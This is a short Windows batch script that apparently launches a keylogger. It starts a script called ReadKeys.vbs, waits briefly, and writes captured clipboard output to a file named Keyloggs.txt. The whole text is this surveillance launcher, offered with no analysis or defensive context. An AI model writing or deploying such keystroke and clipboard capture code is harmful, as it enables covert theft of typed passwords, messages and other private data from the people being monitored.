start ReadKeys.vbs
ping 1.1.1.1 -n 1 -w 200 > nul
ClipOut /T > .\Files\Keyloggs.txt
exit